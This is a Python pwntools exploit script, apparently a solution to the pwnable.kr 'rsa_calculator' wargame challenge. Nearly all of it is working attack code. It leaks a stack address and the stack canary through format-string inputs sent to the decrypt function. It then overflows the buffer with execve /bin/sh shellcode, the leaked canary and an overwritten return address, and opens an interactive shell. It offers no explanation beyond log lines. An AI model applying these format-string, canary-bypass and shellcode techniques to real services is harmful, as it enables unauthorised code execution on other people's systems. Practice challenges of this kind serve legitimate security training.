#usr/bin/python

from pwn import *

r = remote('pwnable.kr',9012)
#r = process('./rsa_calculator')
print util.proc.pidof(r)

shellcode = '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'

def setkey(p,q,e,d):
	r.recvuntil('> ')
	r.sendline('1')
	r.recvuntil('p :')
	r.sendline(str(p))
	r.recvuntil('q :')
	r.sendline(str(q))
	r.recvuntil('e :')
	r.sendline(str(e))
	r.recvuntil('d :')
	r.sendline(str(d))

def decrypt(size,data):
	r.recvuntil('> ')
	r.sendline('3')
	r.recvuntil('(max=1024) :')
	r.sendline(str(size))
	r.recvuntil('data')
	cipher = ''
	for i in range(0,len(data)):
		cipher += str((hex(ord(data[i]))))[2:] + '000000'
	print "cipher text is:",cipher 
	r.sendline(cipher)

setkey(63,51,1,1)
decrypt(-1,'%33$p')
junk = r.recvuntil('- decrypted result -\n')
leak = r.recvline()
log.info('stack address is:%s' % leak)
decrypt_buf = int(leak,16) - 0x4c0
log.info('decrypt buf address is:%s' % hex(decrypt_buf))
decrypt(-1,'%205$p')
junk = r.recvuntil('- decrypted result -\n')
canary = r.recvline().strip()
canary = int(canary,16)
log.info('canary is:%s' % hex(canary))

payload = ''
payload += shellcode
payload += ((0x600)-len(shellcode))*'A'
payload += 'B'*8
payload += p64(canary)
payload += 'B'*8
payload += p64(decrypt_buf)

pause()
r.recvuntil('> ')
r.sendline('3')
r.recvuntil('(max=1024) :')
r.sendline('-1')
r.recvuntil('data')
r.sendline(payload)

r.interactive()
